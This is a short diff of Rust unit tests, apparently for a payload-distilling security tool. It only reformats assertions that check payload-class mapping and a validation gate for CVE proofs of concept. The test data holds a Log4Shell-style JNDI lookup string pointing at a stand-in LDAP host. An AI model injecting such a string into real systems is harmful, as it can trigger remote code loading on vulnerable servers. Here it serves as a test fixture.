@@ -674,7 +674,10 @@ mod tests {
         // use — distill is wired to the one canonical gate, not a private copy.
         assert_eq!(class_for_payload_type(PayloadType::Xss), Some("xss"));
         assert_eq!(class_for_payload_type(PayloadType::Sql), Some("sql"));
-        assert_eq!(class_for_payload_type(PayloadType::CommandInjection), Some("cmdi"));
+        assert_eq!(
+            class_for_payload_type(PayloadType::CommandInjection),
+            Some("cmdi")
+        );
 
         // The structural-class gates are live — they reject an obvious non-attack,
         // so a `--class` override never silently disables the gate for them.
@@ -685,8 +688,16 @@ mod tests {
         // cve_pocs has no per-CVE oracle, so the gate validates ONLY intact
         // transmission (anti-rig, LAW 1): identity passes, any mutation is refused
         // — distilling a CVE PoC can therefore only ever return it unchanged.
-        assert!(oracle_valid("cve_pocs", "${jndi:ldap://x/a}", "${jndi:ldap://x/a}"));
-        assert!(!oracle_valid("cve_pocs", "${jndi:ldap://x/a}", "${jndi:ldap://x/b}"));
+        assert!(oracle_valid(
+            "cve_pocs",
+            "${jndi:ldap://x/a}",
+            "${jndi:ldap://x/a}"
+        ));
+        assert!(!oracle_valid(
+            "cve_pocs",
+            "${jndi:ldap://x/a}",
+            "${jndi:ldap://x/b}"
+        ));
     }
 
     #[tokio::test]
